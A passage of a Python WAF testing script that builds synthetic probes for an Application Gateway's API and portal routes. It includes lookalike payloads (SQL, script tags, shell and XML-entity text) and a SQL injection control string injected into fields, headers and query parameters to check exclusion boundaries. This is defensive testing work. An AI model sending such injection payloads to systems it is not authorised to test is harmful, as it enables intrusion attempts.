"""Send bounded, synthetic compatibility/security probes through an HTTPS AppGW.

The route inventory is read from the checked-in API definitions and Portal route
handlers. Most probes deliberately omit credentials: application rejection proves
only that the request passed the WAF, never that the API works. An optional key
is used exclusively for two OpenAI operations with an invalid-model canary; it
is never sent to Portal, attack probes, connection/session operations or uploads.

Only request metadata and classifications are written. Bodies, response headers,
response bodies, credentials and exception messages are never persisted. A
`User-Agent` is ``egakumi-waf-probe/1.0 <correlation>``; its bounded alphanumeric
correlation is the existing run/case identifier in the report. Access-log query
values are not retained, so no extra correlation query is added. Correlate the
exact User-Agent with AppGW access logs and join firewall logs by TransactionId.
A 403 alone is ambiguous; confirm exclusions using AppGW firewall rule logs.

Examples::

    python scripts/waf_probe.py --list
    python scripts/waf_probe.py --dry-run --output .local/example/evidence/waf-plan.json
    python scripts/waf_probe.py --gateway-base-url https://gateway.example.com \
        --portal-base-url https://portal.example.com --phase before \
        --output .local/example/evidence/waf-before.json
    python scripts/waf_probe.py --gateway-base-url https://gateway.example.com \
        --case-filter 'authenticated-canary' --key-file .local/example/secrets/probe-key.txt \
        --output .local/example/evidence/waf-canary.json
    python scripts/waf_probe.py --ai-coding-only --gateway-base-url https://gateway.example.com \
        --output .local/example/evidence/waf-coding.json
    python scripts/waf_probe.py --image-prompts-only --gateway-base-url https://gateway.example.com \
        --portal-base-url https://portal.example.com --output .local/example/evidence/waf-images.json

This finite corpus cannot enumerate every possible request. WebSocket probes
cover the HTTP upgrade only, not frames (which AppGW WAF does not inspect).
"""
from __future__ import annotations

import os
import sys

# CLI自身と子のPythonが公開ソースの横へbytecodeを書かないようにします。
if __name__ == "__main__":
    sys.dont_write_bytecode = True
    os.environ["PYTHONDONTWRITEBYTECODE"] = "1"

import argparse
import ast
import base64
from collections import Counter
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field, replace
from datetime import datetime, timezone
from email import policy as email_policy
from email.parser import BytesParser
from fnmatch import fnmatchcase
import hashlib
from http.client import HTTPException
from http.cookies import CookieError, SimpleCookie
import io
import json
from pathlib import Path
import re
import ssl
import struct
import subprocess
import tempfile
import threading
import time
import zlib
import zipfile
from typing import Iterable
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qsl, quote, urlencode, urlsplit, urlunsplit
from urllib.request import HTTPRedirectHandler, HTTPSHandler, Request, build_opener
from xml.sax.saxutils import escape

from deployment.helpers.paths import private_parent
from integration_client import private_write


ROOT = Path(__file__).resolve().parents[1]
INVALID_MODEL = "__waf_probe_invalid_model__"
CONTROL_SQL = "1 OR 1=1 UNION SELECT NULL,NULL-- synthetic-waf-probe"
CANARY_ROUTES = frozenset({
    ("POST", "/models/openai/v1/chat/completions"),
    ("POST", "/models/openai/v1/responses"),
})
MAX_RESPONSE_BYTES = 65536
OPAQUE_HEX_SIGNATURE = re.compile(r"(?i:(?:\A|[^\d])0x[a-f\d]{3,})")
TYPED_HISTORY_BYTES = 600 * 1024
DATA_TYPES = frozenset({"conversation", "opaque-base64", "opaque-base64url", "opaque-id", "opaque-ticket", "media-base64",
    "media-data-url", "media-binary", "url", "sdp", "metadata"})
METHODS = r"GET|POST|PUT|PATCH|DELETE|OPTIONS|HEAD"
PARAMETER_VALUES = {
    "deployment": "waf-probe-invalid-model", "callId": "waf-probe-nonexistent-call",
    "id": "00000000-0000-4000-8000-000000000000", "lang": "ja",
    "gateway": "primary", "category": "models", "provider": "openai",
}


@dataclass(frozen=True)
class Route:
    target: str
    method: str
    path: str
    operation: str
    source: str
    body_format: str = "json"
    content_types: tuple[str, ...] = ()
    constraint: dict = field(default_factory=dict, repr=False, compare=False)
    websocket: bool = False


@dataclass(frozen=True)
class Probe:
    case_id: str
    target: str
    method: str
    path: str
    category: str
    intent: str
    source: str
    body: bytes | None = field(default=None, repr=False)
    headers: tuple[tuple[str, str], ...] = field(default=(), repr=False)
    query: tuple[tuple[str, str], ...] = field(default=(), repr=False)
    auth_mode: str = "anonymous"
    payload_field: str | None = None
    data_type: str | None = None


def json_bytes(value) -> bytes:
    """Use real JSON escaping, including control characters and Unicode."""
    return json.dumps(value, ensure_ascii=False, separators=(",", ":")).encode("utf-8")


def concrete_path(path: str) -> str:
    path = re.sub(r"\{([^{}]+)\}", lambda m: PARAMETER_VALUES.get(m[1], "waf-probe-canary"), path)
    path = re.sub(r"\[([^\[\]]+)\]", lambda m: PARAMETER_VALUES.get(m[1], "waf-probe-canary"), path)
    return "/" + path.lstrip("/")


def _literal_assignments(path: Path, names: Iterable[str]) -> dict:
    """Read route constants without importing deployment code or credentials."""
    found = {}
    for statement in ast.parse(path.read_text(encoding="utf-8")).body:
        if isinstance(statement, ast.Assign):
            for target in statement.targets:
                if isinstance(target, ast.Name) and target.id in names:
                    found[target.id] = ast.literal_eval(statement.value)
    return found


def load_routes(root: Path = ROOT) -> list[Route]:
    """Derive public operations from their existing contracts, including MCP/auth."""
    routes = []
    for path in sorted((root / "apps/gateway/apim/apis").glob("*.json")):
        api = json.loads(path.read_text(encoding="utf-8"))
        source = path.relative_to(root).as_posix()
        for operation in api["operations"]:
            constraint = api.get("authorization", {}).get("operationConstraints", {}).get(operation["name"], {})
            full = "/" + api["path"].strip("/") + "/" + operation["urlTemplate"].lstrip("/")
            # The pathModel allowlist is finite and is the same source used by
            # publication. An invented deployment would exercise another route.
            deployments = constraint.get("allowedModels", []) if "{deployment}" in full and constraint.get("parameter") == "deployment" else [None]
            if not deployments:
                raise ValueError("deployment path lacks a finite model allowlist")
            for deployment in deployments:
                concrete = concrete_path(full.replace("{deployment}", quote(deployment, safe="")) if deployment else full)
                routes.append(Route("gateway", operation["method"], concrete,
                    api["name"] + ":" + operation["name"], source,
                    constraint.get("bodyFormat", "none" if operation["method"] == "GET" else "json"),
                    tuple(constraint.get("contentTypes", [])), constraint, api.get("apiType") == "websocket"))
        if "mcp" in api:
            for method in ("GET", "POST", "DELETE"):
                routes.append(Route("gateway", method, "/" + api["mcp"]["path"].strip("/") + "/mcp",
                    api["mcp"]["name"] + ":" + method.lower(), source))

    login_source = root / "scripts/deployment/helpers/credential_login.py"
    names = ("API_PATH", "OPERATIONS", "OPERATION_PATHS", "BROWSER_API_PATH", "BROWSER_OPERATIONS", "BROWSER_OPERATION_PATHS")
    login = _literal_assignments(login_source, names)
    for prefix in ("", "BROWSER_"):
        for operation, method in login[prefix + "OPERATIONS"].items():
            routes.append(Route("gateway", method,
                "/" + login[prefix + "API_PATH"] + "/" + login[prefix + "OPERATION_PATHS"][operation],
                "credential-" + prefix.lower() + operation, login_source.relative_to(root).as_posix()))

    portal_root = root / "apps/portal/app"
    for path in sorted((portal_root / "api").rglob("route.ts")):
        relative = path.relative_to(portal_root).parent.as_posix()
        if "[..." in relative:
            continue  # Resolve the explicit allowlist below instead of inventing catch-all paths.
        text = path.read_text(encoding="utf-8")
        methods = re.findall(r"export\s+(?:async\s+)?function\s+(" + METHODS + r")\b|export\s+const\s+(" + METHODS + r")\s*=", text)
        for method in sorted({a or b for a, b in methods}):
            routes.append(Route("portal", method, concrete_path(relative), "portal:" + relative,
                path.relative_to(root).as_posix(), "none" if method == "GET" else "multipart" if relative == "api/tools/documents" else "json"))
    auth_source = root / "apps/portal/lib/auth-routes.ts"
    for path, method in re.findall(r'\["(/api/auth/[^"\n]+)",\s*"(' + METHODS + r')"\]', auth_source.read_text(encoding="utf-8")):
        routes.append(Route("portal", method, path, "portal-auth:" + path.rsplit("/", 1)[-1],
            auth_source.relative_to(root).as_posix(), "none" if method == "GET" else "json"))
    for path in sorted(portal_root.rglob("page.tsx")):
        relative = path.relative_to(portal_root).parent.as_posix()
        if "[..." in relative or "(" in relative:
            continue
        for locale in ("ja", "en") if "[lang]" in relative else ("ja",):
            concrete = concrete_path(relative.replace("[lang]", locale))
            routes.append(Route("portal", "GET", concrete, "portal-page:" + concrete,
                path.relative_to(root).as_posix(), "none"))
    return sorted(routes, key=lambda route: (route.target, route.path, route.method))


def payloads() -> tuple[tuple[str, str], ...]:
    """Legitimate content that commonly resembles managed-rule attack signatures."""
    opaque = base64.b64encode(bytes(range(256)) * 3).decode()
    values = [
        ("plain", "Synthetic integration probe. Reply OK."),
        ("japanese", "機械生成データ：東京、髙﨑、𠮷野。改行\nとタブ\tの処理。"),
        ("multilingual", "العربية עברית Ελληνικά हिन्दी ไทย 한국어 中文 😀👩🏽‍💻"),
        ("sql-select", "Explain: SELECT id, name FROM inventory WHERE amount >= 10 AND state = 'open';"),
        ("sql-union", "SQL training example: SELECT 'one' UNION SELECT 'two' -- explanation only"),
        ("sql-ddl", "Migration draft: CREATE TABLE probe_example(id INT); DROP TABLE probe_example;"),
        ("sql-functions", "Explain CONCAT(CHAR(65),CHAR(66)), IFNULL(value,0), CAST('1' AS INT)."),
        ("html-script", "Review this source snippet: <script>console.log('probe')</script>"),
        ("html-template", '<div data-value="a&b"><a href="javascript:void(0)">example</a></div>'),
        ("svg-source", '<svg xmlns="http://www.w3.org/2000/svg"><text>probe</text></svg>'),
        ("xml-entity-text", 'Explain XML syntax: <!DOCTYPE example [<!ENTITY harmless "probe">]><example>&harmless;</example>'),
        ("shell-source", "Describe shell syntax: $(printf probe); echo a | sed 's/a/b/'; cat /dev/null"),
        ("powershell-source", "Explain: $values=@(1,2,3); $values | ForEach-Object { $_ * 2 }"),
        ("python-source", 'def f(x):\n    return {"quoted": "<tag>", "value": x} # example'),
        ("js-source", 'const f = (x) => x?.map(v => `${v} && ${v}`); // example'),
        ("regex", r"^(?<name>[A-Za-z_][\w.-]*)\s*=\s*(?:[^;]+);?$|\b(?:SELECT|UNION)\b"),
        ("xpath", "Explain XPath: //book[price>35]/title | /catalog/*[@id='a']"),
        ("ldap", "Explain LDAP filter: (&(objectClass=user)(|(cn=Alice)(cn=Bob)))"),
        ("template", '${user.name} {{ value | escape }} <% print("probe") %> #{7*7}'),
        ("paths", r"Document path examples: ../templates/readme.txt C:\\work\\example.txt /etc/example.conf"),
        ("url-encodings", "Literal encoded text: %27%20OR%201%3D1 %3Cscript%3E %252e%252e%252f + / = & ? #"),
        ("escaped-controls", "escaped controls: \x00\x01\x08\t\n\r\x1b\x7f end"),
        ("unicode-normalization", "é e\u0301 ＡＢＣ ＜script＞ \u202eprobe\u202c \u200b\ufeff"),
        ("punctuation", "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~" * 4),
        ("opaque-base64", opaque),
        ("opaque-base64url", base64.urlsafe_b64encode(bytes(range(256))).decode().rstrip("=")),
        ("opaque-jwt", "eyJhbGciOiJub25lIn0.eyJzdWIiOiJzeW50aGV0aWMtcHJvYmUifQ."),
        ("json-string", '{"items":[{"filter":"a > b && c < d","sql":"SELECT 1"}],"path":"a/b"}'),
        ("csv", 'name,expression\n"probe","=IF(A1>0,\"yes\",\"no\")"\n'),
        ("markdown", "```sql\nSELECT 1; -- documentation\n```\n[example](https://example.invalid/?a=1&b=2)"),
        ("long-punctuation", "a=1&b=2|x<>y;'\"(){}[]/\\" * 96),
        ("long-opaque", hashlib.sha256(b"waf-probe-fixture").hexdigest() * 160),
    ]
    return tuple(values)


def _wav() -> bytes:
    samples = b"\0\0" * 160
    return b"RIFF" + struct.pack("<I", 36 + len(samples)) + b"WAVEfmt " + struct.pack("<IHHIIHH", 16, 1, 1, 16000, 32000, 2, 16) + b"data" + struct.pack("<I", len(samples)) + samples


def _ooxml_fixture(mime: str, text: str) -> bytes:
    """Build deterministic synthetic package parts; this does not assert Office rendering."""
    office = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
    package = "http://schemas.openxmlformats.org/package/2006/relationships"
    escaped = escape(text)
    if mime.endswith("wordprocessingml.document"):
        main = "word/document.xml"
        parts = {main: ('<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t xml:space="preserve">' + escaped + "</w:t></w:r></w:p></w:body></w:document>")}
        types = {main: "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"}
    elif mime.endswith("spreadsheetml.sheet"):
        main = "xl/workbook.xml"
        parts = {
            main: f'<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="{office}"><sheets><sheet name="Synthetic" sheetId="1" r:id="rId1"/></sheets></workbook>',
            "xl/_rels/workbook.xml.rels": f'<Relationships xmlns="{package}"><Relationship Id="rId1" Type="{office}/worksheet" Target="worksheets/sheet1.xml"/></Relationships>',
            "xl/worksheets/sheet1.xml": '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t xml:space="preserve">' + escaped + "</t></is></c></row></sheetData></worksheet>",
        }
        types = {main: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml", "xl/worksheets/sheet1.xml": "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"}
    else:
        main = "ppt/presentation.xml"
        parts = {
            main: f'<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:r="{office}"><p:sldIdLst><p:sldId id="256" r:id="rId1"/></p:sldIdLst><p:sldSz cx="9144000" cy="6858000"/><p:notesSz cx="6858000" cy="9144000"/></p:presentation>',
            "ppt/_rels/presentation.xml.rels": f'<Relationships xmlns="{package}"><Relationship Id="rId1" Type="{office}/slide" Target="slides/slide1.xml"/></Relationships>',
            "ppt/slides/slide1.xml": '<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"><p:cSld><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr/><p:sp><p:nvSpPr><p:cNvPr id="2" name="Synthetic"/><p:cNvSpPr txBox="1"/><p:nvPr/></p:nvSpPr><p:spPr/><p:txBody><a:bodyPr/><a:lstStyle/><a:p><a:r><a:t>' + escaped + "</a:t></a:r></a:p></p:txBody></p:sp></p:spTree></p:cSld></p:sld>",
        }
        types = {main: "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml", "ppt/slides/slide1.xml": "application/vnd.openxmlformats-officedocument.presentationml.slide+xml"}
    parts["_rels/.rels"] = f'<Relationships xmlns="{package}"><Relationship Id="rId1" Type="{office}/officeDocument" Target="{main}"/></Relationships>'
    parts["[Content_Types].xml"] = ('<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/>'
        + "".join(f'<Override PartName="/{name}" ContentType="{kind}"/>' for name, kind in types.items()) + "</Types>")
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w") as archive:
        for name in sorted(parts):
            info = zipfile.ZipInfo(name, date_time=(1980, 1, 1, 0, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            info.create_system = 0
            info.external_attr = 0x20
            archive.writestr(info, parts[name].encode("utf-8"))
    return output.getvalue()


def _binary_fixture(mime: str, text: str = "Synthetic WAF media boundary fixture", *, transparent: bool = False) -> bytes:
    """Provide real MIME signatures; no document/audio feature success is claimed.

    PNG, BMP, WAV and OOXML use minimal valid containers/packages. Other fixtures
    supply synthetic signature/comment structures, including HEIF file-type boxes.
    Their role is WAF/MIME inspection, not downstream decoding or OCR success.
    """
    content = text.encode("utf-8")
    if mime == "audio/wav":
        comment = content + (b"\x00" if len(content) % 2 else b"")
        info = b"INFOICMT" + struct.pack("<I", len(content)) + comment
        original = _wav()
        result = original + b"LIST" + struct.pack("<I", len(info)) + info
        return result[:4] + struct.pack("<I", len(result) - 8) + result[8:]
    if mime == "application/pdf":
        return b"%PDF-1.4\n% Synthetic WAF boundary fixture\n% " + content.replace(b"\n", b"\n% ") + b"\n%%EOF\n"
    if mime == "image/png":
        def chunk(name: bytes, data: bytes) -> bytes:
            return struct.pack(">I", len(data)) + name + data + struct.pack(">I", zlib.crc32(name + data) & 0xffffffff)
        return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 6 if transparent else 2, 0, 0, 0))
                + chunk(b"tEXt", b"Comment\x00" + content) + chunk(b"IDAT", zlib.compress(b"\x00" * (5 if transparent else 4))) + chunk(b"IEND", b""))
    if mime == "image/jpeg":
        comment = content[:65500]
        return b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" + b"\xff\xfe" + struct.pack(">H", len(comment) + 2) + comment + b"\xff\xd9"
    if mime == "image/tiff":
        return b"II\x2a\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00" + content
    if mime == "image/bmp":
        return b"BM" + struct.pack("<IHHI", 58 + len(content), 0, 0, 54) + struct.pack("<IiiHHIIiiII", 40, 1, 1, 1, 24, 0, 4, 0, 0, 0, 0) + b"\x00\x00\x00\x00" + content
    if mime in {"image/heif", "image/heic"}:
        brand = b"mif1" if mime == "image/heif" else b"heic"
        file_type = brand + b"\x00\x00\x00\x00" + brand + (b"mif1" if mime == "image/heic" else b"")
        return struct.pack(">I", len(file_type) + 8) + b"ftyp" + file_type + struct.pack(">I", len(content) + 8) + b"free" + content
    if mime in {"application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "application/vnd.openxmlformats-officedocument.presentationml.presentation"}:
        return _ooxml_fixture(mime, text)
    if mime == "text/html":
        return ('<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Synthetic WAF fixture</title></head><body><p>' + escape(text) + "</p></body></html>").encode("utf-8")
    return b"\x00\x01\x02\x7f\x80\xff" * 64


def _multipart(text: str, boundary: str = "waf-probe-fixed-boundary", *, portal_input: dict | None = None, document: bool = False, file_mime: str | None = None, file_field: str = "file") -> bytes:
    out = io.BytesIO()
    fields = (("input", json_bytes(portal_input).decode()),) if portal_input is not None else (("model", INVALID_MODEL), ("prompt", text), ("response_format", "json"))
    for name, value in fields:
        out.write((f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n').encode())
    mime = file_mime or ("application/pdf" if document else "audio/wav")
    extension = {"application/pdf": "pdf", "image/png": "png", "image/jpeg": "jpg", "image/tiff": "tiff", "image/bmp": "bmp", "audio/wav": "wav", "image/heif": "heif", "image/heic": "heic", "text/html": "html", "application/vnd.openxmlformats-officedocument.wordprocessingml.document": "docx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet": "xlsx", "application/vnd.openxmlformats-officedocument.presentationml.presentation": "pptx"}.get(mime, "bin")
    out.write((f'--{boundary}\r\nContent-Disposition: form-data; name="{file_field}"; filename="probe.{extension}"\r\nContent-Type: {mime}\r\n\r\n').encode())
    out.write(_binary_fixture(mime, text))
    out.write((f"\r\n--{boundary}--\r\n").encode())
    return out.getvalue()


def _json_variants(route: Route, text: str, canary: bool = False) -> list[tuple[str, dict]]:
    """Place one variable at a time into actual application content fields."""
    model = INVALID_MODEL if canary else (route.constraint.get("allowedModels") or ["waf-probe-invalid-model"])[0]
    op = route.operation
    portal_key = "portal-00000000-0000-4000-8000-000000000001"
    sdp = "v=0\r\no=- 1 1 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\nm=audio 9 UDP/TLS/RTP/SAVPF 111\r\na=x-waf-probe:" + text.replace("\r", " ").replace("\n", " ") + "\r\n"
    if route.target == "portal":
        common = {"apiKeyId": portal_key}
        if route.path == "/api/models/generate":
            return [("message", {**common, "modelId": "gpt-6-luna", "message": text, "stream": False})]
        if route.path == "/api/models/embeddings":
            return [("texts[]", {**common, "modelId": "text-embedding-3-small", "dimensions": 256, "inputType": None, "texts": [text]})]
        if route.path == "/api/models/rerank":
            base = {**common, "modelId": "Cohere-rerank-v4.0-fast", "query": "probe", "documents": ["sample"], "topN": 1}
            return [("query", {**base, "query": text}), ("documents[]", {**base, "documents": [text]})]
        if route.path == "/api/models/decision":
            base = {**common, "modelId": "decision-1"}
            return _decision_variants(base, text)
        if route.path == "/api/models/images":
            return [("prompt", {**common, "modelId": "gpt-image-2", "prompt": text, "size": "1024x1024", "quality": "low", "width": 512, "height": 512, "outputFormat": "png"})]
        if route.path == "/api/models/speech":
            return [("text", {**common, "modelId": "azure-speech-tts", "text": text, "voice": "ja-JP-NanamiNeural", "rate": "0%"})]
        if route.path in {"/api/tools/pii", "/api/tools/pii-mcp"}:
            return [("text", {**common, "text": text, "language": "en"})]
        # Administration and sign-in endpoints are anonymous validation probes.
        return [("validation_canary", {"_waf_probe_validation_canary": text})]
    if "chat-completions" in op:
        base = {"model": model, "messages": [{"role": "user", "content": "Synthetic probe"}], "max_completion_tokens": 1}
        return [
            ("messages[].content", {**base, "messages": [{"role": "user", "content": text}]}),
            ("messages[].content[].text", {**base, "messages": [{"role": "user", "content": [{"type": "text", "text": text}]}]}),
            ("tools[].function.description", {**base, "tools": [{"type": "function", "function": {"name": "synthetic_probe", "description": text, "parameters": {"type": "object", "properties": {}}}}]}),
            ("tools[].function.parameters.properties.value.description", {**base, "tools": [{"type": "function", "function": {"name": "synthetic_probe", "parameters": {"type": "object", "properties": {"value": {"type": "string", "description": text}}}}}]}),
            ("messages[].tool_calls[].function.arguments", {**base, "messages": [{"role": "user", "content": "Review function arguments."}, {"role": "assistant", "tool_calls": [{"id": "call_waf_probe", "type": "function", "function": {"name": "synthetic_probe", "arguments": json_bytes({"value": text}).decode()}}]}, {"role": "tool", "tool_call_id": "call_waf_probe", "content": "Synthetic fixture"}]}),
        ]
    if "responses-create" in op:
        base = {"model": model, "input": "Synthetic probe", "max_output_tokens": 1, "store": False}
        return [
            ("input", {**base, "input": text}),
            ("instructions", {**base, "instructions": text}),
            ("input[].content[].text", {**base, "input": [{"role": "user", "content": [{"type": "input_text", "text": text}]}]}),
            ("tools[].description", {**base, "tools": [{"type": "function", "name": "synthetic_probe", "description": text, "parameters": {"type": "object", "properties": {}}}]}),
            ("text.format.schema.properties.value.description", {**base, "text": {"format": {"type": "json_schema", "name": "synthetic_probe", "schema": {"type": "object", "properties": {"value": {"type": "string", "description": text}}, "required": ["value"], "additionalProperties": False}}}}),
            ("input[].output", {**base, "input": [{"type": "function_call", "call_id": "call_waf_probe", "name": "synthetic_probe", "arguments": "{}"}, {"type": "function_call_output", "call_id": "call_waf_probe", "output": text}]}),
        ]
    if "cohere" in op and "embed" in op:
        return [("texts[]", {"model": model, "texts": [text], "input_type": "search_document", "embedding_types": ["float"]})]
    if "embedding" in op:
        return [("input[]", {"model": model, "input": [text]})]
    if "rerank" in op:
        base = {"model": model, "query": "probe", "documents": ["sample"], "top_n": 1}
        return [("query", {**base, "query": text}), ("documents[]", {**base, "documents": [text]})]
    if route.constraint.get("kind") == "pii":
        return [("text", {"text": text, "language": "en"})]
    if "mcp" in op:
        return [("params.arguments.text", {"jsonrpc": "2.0", "id": "waf-probe", "method": "tools/call", "params": {"name": "pii_redact_text", "arguments": {"text": text, "language": "en"}}})]
    if "decision" in op:
        return _decision_variants({"model": model}, text)
    if route.constraint.get("kind") == "realtimeCreate":
        return [("sdp", {"sdp": sdp})]
    if "live-control" in op:
        return [("instructions", {"sdp": sdp.split("a=x-waf-probe:")[0], "instructions": text, "voice": "marin"}), ("sdp", {"sdp": sdp, "instructions": "probe", "voice": "marin"})]
    if "image" in op:
        return [("prompt", {"model": model, "prompt": text, "n": 1, "size": "1024x1024", "quality": "low"})]
    return [("validation_canary", {"_waf_probe_validation_canary": text})]


def _decision_variants(base: dict, text: str) -> list[tuple[str, dict]]:
    return [
        ("state.message", {**base, "state": {"message": text}, "questions": {"q": {"type": "noul", "instructions": "Is this a code sample?"}}}),
        ("state.nested.items[].value", {**base, "state": {"nested": {"items": [{"value": text}]}}, "questions": {"q": {"type": "noul", "instructions": "Is this a code sample?"}}}),
        ("questions.*.instructions", {**base, "state": {"message": "Synthetic probe"}, "questions": {"q": {"type": "noul", "instructions": text}}}),
        ("questions.*.criteria.*", {**base, "state": {"message": "Synthetic probe"}, "questions": {"q": {"type": "choice", "instructions": "Choose.", "criteria": {"a": text, "b": "Other"}}}}),
        ("questions.*.criteria[]", {**base, "state": {"message": "Synthetic probe"}, "questions": {"q": {"type": "score", "instructions": "Score.", "criteria": [text, "Other"]}}}),
    ]


def _body(route: Route, text: str, canary: bool = False) -> tuple[bytes | None, str]:
    if route.method in {"GET", "HEAD", "DELETE"} or route.body_format == "none":
        return None, ""
    content_type = (route.content_types or ("application/json",))[0]
    if route.body_format == "text":
        return ('<speak version="1.0" xml:lang="en-US"><voice name="en-US-JennyNeural">' + escape(text) + "</voice></speak>").encode(), content_type
    if route.body_format == "binary":
        return _binary_fixture(content_type, text), content_type
    if route.body_format == "multipart":
        portal_input = {"model": "prebuilt-read", "apiKeyId": "portal-00000000-0000-4000-8000-000000000001"} if route.target == "portal" else None
        image_edit = "image-edit" in route.operation
        return _multipart(text, portal_input=portal_input, document=route.target == "portal", file_mime="image/png" if image_edit else None, file_field="image" if image_edit else "file"), "multipart/form-data; boundary=waf-probe-fixed-boundary"
    value = _json_variants(route, text, canary)[0][1]
    return json_bytes(value), "application/json"


def _probe(route: Route, suffix: str, category: str, *, intent: str = "compatibility",
           body: bytes | None = None, headers=(), query=(), auth_mode: str = "anonymous", payload_field: str | None = None,
           data_type: str | None = None) -> Probe:
    if data_type is not None and data_type not in DATA_TYPES:
        raise ValueError("unknown synthetic fixture data type")
    stable = f"{route.target}:{route.method}:{route.path}:{suffix}"
    slug = re.sub(r"[^a-z0-9]+", "-", route.operation.lower()).strip("-")[:64]
    case_id = f"{route.target}-{slug}-{suffix}-{hashlib.sha256(stable.encode()).hexdigest()[:8]}"
    return Probe(case_id, route.target, route.method, route.path, category, intent, route.source,
                 body, tuple(headers), tuple(query), auth_mode, payload_field, data_type)


def boundary_controls(routes: list[Route]) -> list[Probe]:
    """Verify that data exclusions do not spill into control fields or paths.

    A query collision is intentionally classified as validation: Azure argument
    value exclusions may also cover a query argument with the same name. The
    firewall logs must establish that behavior; a successful WAF transit alone
    does not make the query an approved application input.
    """
    cases = []
    for route in routes:
        if route.method != "POST" or route.body_format == "none":
            continue
        variants = _json_variants(route, "Synthetic exclusion boundary baseline")
        free_json = route.body_format == "json" and variants[0][0] != "validation_canary"
        if not free_json and route.body_format not in {"text", "multipart", "binary"}:
            continue
        normal_body, mime = _body(route, "Synthetic exclusion boundary baseline")
        headers = [("Content-Type", mime)]
        if free_json:
            value = variants[0][1]
            model_name = "modelId" if route.target == "portal" and "modelId" in value else "model"
            cases.append(_probe(route, "control-model-sqli", "control-field-model", intent="attack_control",
                body=json_bytes({**value, model_name: CONTROL_SQL}), headers=headers, payload_field=model_name))
            cases.append(_probe(route, "control-unknown-sqli", "control-field-unknown", intent="attack_control",
                body=json_bytes({**value, "_attack": CONTROL_SQL}), headers=headers, payload_field="_attack"))
            neighbor_body = json_bytes(_json_variants(route, CONTROL_SQL)[0][1])
            neighbor_query = ()
            neighbor_field = variants[0][0]
        else:
            # Preserve SSML/media/multipart bodies while attacking control args.
            for name, label in (("model", "model"), ("_attack", "unknown")):
                cases.append(_probe(route, f"control-{label}-sqli", f"control-field-{label}", intent="attack_control",
                    body=normal_body, headers=headers, query=[(name, CONTROL_SQL)], payload_field="query:" + name))
            neighbor_body, neighbor_query, neighbor_field = normal_body, (("id", CONTROL_SQL),), "query:id"
        cases.append(_probe(route, "control-header-sqli", "control-header", intent="attack_control",
            body=normal_body, headers=headers + [("X-Attack", CONTROL_SQL)], payload_field="header:X-Attack"))
        cases.append(_probe(route, "control-query-sqli", "control-query", intent="attack_control",
            body=normal_body, headers=headers, query=[("id", CONTROL_SQL)], payload_field="query:id"))
        neighbor = replace(route, path=route.path.rstrip("/") + "/neighbor")
        cases.append(_probe(neighbor, "control-neighbor-sqli", "control-neighbor-path", intent="attack_control",
            body=neighbor_body, headers=headers, query=neighbor_query, payload_field=neighbor_field))
        if free_json:
            query_names = {field_name.split(".", 1)[0].replace("[]", "") for field_name, _ in variants}
            # Also check leaf names such as content/arguments whose Values
            # selectors may be chosen by an observed-rule exclusion manifest.
            query_names |= {field_name.rsplit(".", 1)[-1].replace("[]", "") for field_name, _ in variants}
            for name in sorted(query_names - {"*"}):
                slug = hashlib.sha256(name.encode()).hexdigest()[:8]
                cases.append(_probe(route, "data-query-name-collision-" + slug, "data-query-name-collision", intent="validation",
                    body=normal_body, headers=headers, query=[(name, CONTROL_SQL)], payload_field="query:" + name))
        elif route.body_format == "text":
            cases.append(_probe(route, "data-query-name-collision-text", "data-query-name-collision", intent="validation",
                body=normal_body, headers=headers, query=[("text", CONTROL_SQL)], payload_field="query:text"))
        elif route.body_format == "multipart":
            name = "input" if route.target == "portal" else "prompt"
            cases.append(_probe(route, "data-query-name-collision-multipart", "data-query-name-collision", intent="validation",
                body=normal_body, headers=headers, query=[(name, CONTROL_SQL)], payload_field="query:" + name))
    return cases


def _schema_variants(text: str) -> list[tuple[str, str, dict]]:
    """Exercise generated schema values separately from arbitrary property names."""
    variants = []
    for label, field_name, value in (
        ("pattern", "pattern", "(?:" + re.escape(text) + ")"),
        ("enum", "enum", [text, "Synthetic alternative"]),
        ("default", "default", text),
        ("examples", "examples", [text]),
    ):
        schema = {"type": "object", "properties": {"value": {"type": "string", field_name: value}},
                  "required": ["value"], "additionalProperties": False}
        variants.append((label, "properties.value." + field_name + ("[]" if isinstance(value, list) else ""), schema))
    variants.append(("dynamic-key", "keys:properties", {"type": "object", "properties": {text: {"type": "string"}}, "additionalProperties": False}))
    inner = {"type": "object", "properties": {"value": {"type": "string", "default": text}}, "additionalProperties": False}
    schema = {"type": "object", "$defs": {"outer": {"type": "object", "$defs": {"inner": inner},
